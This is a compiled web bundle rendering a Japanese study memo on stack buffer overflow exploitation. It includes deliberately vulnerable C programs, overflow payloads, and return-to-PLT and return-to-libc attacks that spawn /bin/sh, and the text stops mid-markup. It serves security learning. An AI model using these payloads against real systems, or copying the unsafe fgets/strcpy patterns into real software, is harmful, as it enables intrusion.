(window.webpackJsonp=window.webpackJsonp||[]).push([[54],{325:function(t,a,s){"use strict";s.r(a);var e=s(10),n=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"ハリネズミ本-pwnのめも"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ハリネズミ本-pwnのめも"}},[t._v("#")]),t._v(" ハリネズミ本 pwnのめも")]),t._v(" "),a("h1",{attrs:{id:"実行環境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#実行環境"}},[t._v("#")]),t._v(" 実行環境")]),t._v(" "),a("p",[t._v("OSはUbuntu-18.04 LTSを使用しています。")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('$ cat /etc/os-release \nNAME="Ubuntu"\nVERSION="18.04.2 LTS (Bionic Beaver)"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 18.04.2 LTS"\nVERSION_ID="18.04"\nHOME_URL="https://www.ubuntu.com/"\nSUPPORT_URL="https://help.ubuntu.com/"\nBUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"\nPRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"\nVERSION_CODENAME=bionic\nUBUNTU_CODENAME=bionic\n')])])]),a("h1",{attrs:{id:"使用するツール"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用するツール"}},[t._v("#")]),t._v(" 使用するツール")]),t._v(" "),a("h2",{attrs:{id:"gdb-peda"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#gdb-peda"}},[t._v("#")]),t._v(" GDB(peda)")]),t._v(" "),a("p",[t._v("GDBはCLIベースのデバッガです。\nGDBにより, 実行ファイルがオーバーフローを起こした時に, 実行ファイルが停止した位置やその時の変数の値などを知ることができます。\nまた, pedaという拡張スクリプトを追加することで,\nEBXやEIPなどの情報や関数のアドレスを取得することができます。\n非常に便利なので, インストールすることをおすすめします。")]),t._v(" "),a("h2",{attrs:{id:"objdump"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#objdump"}},[t._v("#")]),t._v(" objdump")]),t._v(" "),a("p",[t._v("objdumpはCUIベースの逆アセンブラです。\n実行ファイルを解析して, アセンブリコードを出力してくれます。")]),t._v(" "),a("p",[t._v("さて, 前置きはこのくらいにして実際に問題を見ていきましょう。")]),t._v(" "),a("h1",{attrs:{id:"stack-base-buffer-overflow"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#stack-base-buffer-overflow"}},[t._v("#")]),t._v(" stack base buffer overflow")]),t._v(" "),a("h2",{attrs:{id:"ローカル変数の破壊"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ローカル変数の破壊"}},[t._v("#")]),t._v(" ローカル変数の破壊")]),t._v(" "),a("div",{staticClass:"language-cpp extra-class"},[a("pre",{pre:!0,attrs:{class:"language-cpp"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// bof1.c")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[t._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" zero "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  \n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdin")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"zero = %d\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" zero"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("上のコードを32bit向け, SSP(stack smash protection)無効でコンパイルする.\nこの後, "),a("code",[t._v("AAAAAAAAAAAAAAAAAAAA")]),t._v("のような文字列を与えることでbuffer overflowを意図的に引き起こす。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ gcc -m32 -fno-stack-protector ./bof1 ./bof1.c\n$ ./bof1\nbuffer address  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd062\nzero address    "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd06c\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nzero "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1094795585")]),t._v("\nSegmentation fault "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("core dumped"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("ここで, buffer addressが"),a("code",[t._v("ffffd062")]),t._v("で, zero addressが"),a("code",[t._v("ffffd06c")]),t._v("なのは,\nmain関数の中で順番に変数がstackに積まれて行くから("),a("code",[t._v("ffffd062")]),t._v(" + "),a("code",[t._v("10")]),t._v(" = "),a("code",[t._v("ffffd06c")]),t._v(")。")]),t._v(" "),a("p",[t._v("実行結果が, "),a("code",[t._v("1094795585")]),t._v("となっているのは, "),a("code",[t._v("AAAA")]),t._v("="),a("code",[t._v("0x41414141")]),t._v(" = "),a("code",[t._v("1094795585")]),t._v("だから。")]),t._v(" "),a("p",[t._v("これを用いて, 任意の値を"),a("code",[t._v("zero")]),t._v("に代入してみる。")]),t._v(" "),a("h2",{attrs:{id:"bofを活用した-任意の数字の書き換え"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bofを活用した-任意の数字の書き換え"}},[t._v("#")]),t._v(" bofを活用した, 任意の数字の書き換え")]),t._v(" "),a("div",{staticClass:"language-cpp extra-class"},[a("pre",{pre:!0,attrs:{class:"language-cpp"}},[a("code",[a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[t._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" zero "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"buffer address\\t= %x\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"zero address\\t= %x\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("zero"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  \n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdin")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"zero = %d\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" zero"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("zero "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x12345678")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"congrats!\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("これも, 先ほどと同様に, SSP無効でコンパイル。\nこの後, bufferの10バイト文を適当な文字で埋めてから, 0x12345678で埋める。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ gcc -m32 -fno-stack-protector -o ./bof2 ./bof2.c\n$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'AAAAAAAAAA\\x78\\x56\\x34\\x12'")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./bof2\nbuffer address                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd062\nzero address                           "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd06c\nzero "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("12345678")]),t._v("\ncongrats"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\nSegmentation fault "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("core dumped"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("はい, おk。\nここで, リトルエンディアン形式であることに注意。")]),t._v(" "),a("p",[a("code",[t._v("$ echo -e 'AAAAAAAAAA\\x78\\x56\\x34\\x12' | ./bof2")]),t._v("\nについて, "),a("code",[t._v("-e")]),t._v("オプションは"),a("code",[t._v("\\x")]),t._v("表記を認めるというオプション。\nリトルエンディアン形式なので, "),a("code",[t._v("\\x78\\x56\\x34\\x12")]),t._v("という表記になっている。")]),t._v(" "),a("h1",{attrs:{id:"bofを活用した-リターンアドレスの書き換え"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bofを活用した-リターンアドレスの書き換え"}},[t._v("#")]),t._v(" bofを活用した, リターンアドレスの書き換え")]),t._v(" "),a("div",{staticClass:"language-c extra-class"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[t._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[t._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("<string.h>")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" local"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"buffer address\\t= %x\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"local address\\t= %x\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("local"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"buffer: 0x%x\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("local"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("128")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdin")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("strcpy")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" local"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("このままだと, EIPを奪取できない(コンパイラが防いでいるらしい)\n"),a("a",{attrs:{href:"https://hiziriai.hatenablog.com/entry/2017/05/17/234505",target:"_blank",rel:"noopener noreferrer"}},[t._v("詳しくはこの記事で"),a("OutboundLink")],1)]),t._v(" "),a("h2",{attrs:{id:"pythonでの-xの書き込み"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#pythonでの-xの書き込み"}},[t._v("#")]),t._v(" pythonでの\\xの書き込み")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ python -c "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'import sys; sys.stdout.buffer.write(b"A" * 16 +  b"\\xce\\xfa\\xde\\xc0")\'')]),t._v("\n")])])]),a("p",[t._v("のように書くと,")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'AAAAAAAAAAAAAAAA\\xce\\xfa\\xde\\xc0'")]),t._v("\n")])])]),a("p",[t._v("と同じ意味になる。")]),t._v(" "),a("p",[t._v("main 630 56555630?\nprintf 410 56555554?")]),t._v(" "),a("p",[a("a",{attrs:{href:"http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/",target:"_blank",rel:"noopener noreferrer"}},[t._v("神記事"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("system: 0xf7 e1 62 00\n引数")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('#include <stdio.h>\n#include <string.h>\n\nchar buffer[32];\n\nvoid func(){\n    char local[32];\n  fgets(local, 128, stdin);\n  strcpy(buffer, local);\n}\n\nint main(){\n  printf("buffer: 0x%x\\n", &buffer);\n  func();\n}\n\n')])])]),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("$ (echo -e 'r\\n/bin/sh\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x62\\xe1\\xf7\\xf1\\x84\\x04\\x08\\x60\\xa0\\x04\\x08';cat) | gdb -q ./ret2libc \n")])])]),a("h2",{attrs:{id:"return-to-plt"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#return-to-plt"}},[t._v("#")]),t._v(" return to PLT")]),t._v(" "),a("h3",{attrs:{id:"仕組み"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#仕組み"}},[t._v("#")]),t._v(" 仕組み")]),t._v(" "),a("p",[t._v("printf@pltを呼び出す。\nprintfを引数込みで呼び出す。")]),t._v(" "),a("p",[t._v("ret命令の挙動は, (1)現在のeipをpopして(2)そのeipのアドレスにjumpするというもの。")]),t._v(" "),a("p",[t._v("call命令は, (1)スタックにリターンアドレスを積んでから(引数も積む)(2)jumpを行うというもの。")]),t._v(" "),a("p",[t._v("したがって, ret命令でcall命令を再現するには, (1)スタックにリターンアドレスを積んでおけばおk(引数も積む)。")]),t._v(" "),a("h3",{attrs:{id:"攻撃コード"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻撃コード"}},[t._v("#")]),t._v(" 攻撃コード")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("アドレス")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("下位アドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("関数のアドレス=リターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x08048340")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("printf@plt")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("printf呼び出し後のリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("BBBB")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("ダミー")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("printfの引数(buffer)")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a040")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("bufferの中身を表示したいので")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("上位アドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0xffffffff")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})])])]),t._v(" "),a("p",[t._v("gdbでpattern_createおよびpattoをかけて, EIPに設定されるのが44文字目以降であることを確認。")]),t._v(" "),a("p",[t._v("以上の順にEIPを埋めていけば良いため, 攻撃コードの概要は以下のようになる。\n"),a("code",[t._v("A*44文字 + \\x40\\x83\\x04\\x08 + BBBB + \\x40\\xa0\\x04\\x08")])]),t._v(" "),a("p",[t._v("したがって, 攻撃コードは以下の通り。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ python -c "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'import sys; sys.stdout.buffer.write(b"A"*44 + b"\\x40\\x83\\x04\\x08" + b"BBBB" + b"\\x40\\xa0\\x04\\x08")\'')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./plt\n")])])]),a("p",[t._v("と思いきや, 実行がうまくいきません。")]),t._v(" "),a("p",[t._v("調べてみると, リターンアドレスがダミーだとprintf関数が正しく実行されないようです(printf関数のret時にreturnアドレスが正しくないとSegmentationFaultになるらしい)\nhttp://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/")]),t._v(" "),a("h2",{attrs:{id:"return-to-libc"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#return-to-libc"}},[t._v("#")]),t._v(" Return to libc")]),t._v(" "),a("h3",{attrs:{id:"仕組み-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#仕組み-2"}},[t._v("#")]),t._v(" 仕組み")]),t._v(" "),a("p",[t._v("return to PLTではprintf関数を呼び出しましたが, 次はsystem関数を実行してみましょう。")]),t._v(" "),a("p",[t._v("system関数の実行では, /bin/sh(bash)を実行することとします。なぜなら, shellを奪えればその後はコマンドを叩いて大抵のことはできるようになるからです。")]),t._v(" "),a("h3",{attrs:{id:"攻撃方法の検討"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻撃方法の検討"}},[t._v("#")]),t._v(" 攻撃方法の検討")]),t._v(" "),a("p",[t._v("まず, system関数の場所を確認します。\nmain関数にbreakpointを立ててrunし, p systemで確認できます。")]),t._v(" "),a("p",[t._v("すると, 以下のように表示されるのでsystem関数は"),a("code",[t._v("0xf7e16200")]),t._v("にあることがわかります。")]),t._v(" "),a("div",{staticClass:"language- 